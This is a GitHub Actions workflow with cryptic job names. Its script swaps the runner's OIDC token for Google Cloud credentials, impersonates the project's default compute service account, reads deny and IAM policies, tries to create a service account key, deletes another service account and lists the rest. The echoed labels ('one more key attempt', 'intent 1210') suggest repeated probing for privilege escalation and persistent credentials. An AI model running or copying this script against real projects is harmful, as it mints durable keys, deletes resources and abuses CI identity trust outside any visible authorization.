name: wf1210c
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  wf1210c:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - name: r3
        run: |
          set +e
          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
          NUM=363590592857
          SA=363590592857-compute@developer.gserviceaccount.com
          PRJ=projects/363590592857/locations/global/workloadIdentityPools/github-action/providers/github
          PID=tranquil-post-357802
          AUD="https://iam.googleapis.com/$PRJ"
          rm -f tok.jwt
          curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r '.value // empty' > tok.jwt
          echo "mintlen=$(wc -c < tok.jwt)"
          c=$(curl -s -o r.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
            -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
            --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
            --data-urlencode "subject_token=$(cat tok.jwt)" \
            -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
            -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
            -d "scope=https://www.googleapis.com/auth/cloud-platform")
          echo "##STS code=$c"
          FT=$(jq -r '.access_token // empty' r.json)
          c=$(curl -s -o g.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json)
          AT=$(jq -r '.accessToken // empty' g.json)
          echo "##GEN code=$c toklen=${#AT}"
          echo "--- deny policies at project attachment point"
          c=$(curl -s -o d1.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://iam.googleapis.com/v2/policies/cloudresourcemanager.googleapis.com%2Fprojects%2F363590592857/denypolicies")
          echo "##DENY code=$c body=$(head -c 500 d1.json | tr -d '\n' | tr -s ' ')"
          echo "--- SA getIamPolicy (read)"
          c=$(curl -s -o d2.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$SA:getIamPolicy" -d '{"options":{"requestedPolicyVersion":3}}')
          echo "##SAPOL code=$c body=$(head -c 500 d2.json | tr -d '\n' | tr -s ' ')"
          echo "--- one more key attempt on compute SA (final confirmation)"
          c=$(curl -s -o k.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$SA/keys" -d '{"keyAlgorithm":"KEY_ALG_RSA_2048"}')
          echo "##KEY code=$c body=$(head -c 400 k.json | tr -d '\n' | tr -s ' ')"
          echo "--- CLEANUP: delete the SA created by intent 1210"
          c=$(curl -s -o del.json -w '%{http_code}' -X DELETE -H "Authorization: Bearer $AT" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/vertex-ci-a15401af@363590592857.iam.gserviceaccount.com")
          echo "##DEL code=$c body=$(head -c 300 del.json | tr -d '\n' | tr -s ' ')"
          echo "--- SA list after cleanup"
          c=$(curl -s -o sl.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts?pageSize=50")
          echo "##SALIST code=$c body=$(head -c 700 sl.json | tr -d '\n' | tr -s ' ')"
          echo "##FINISHED"
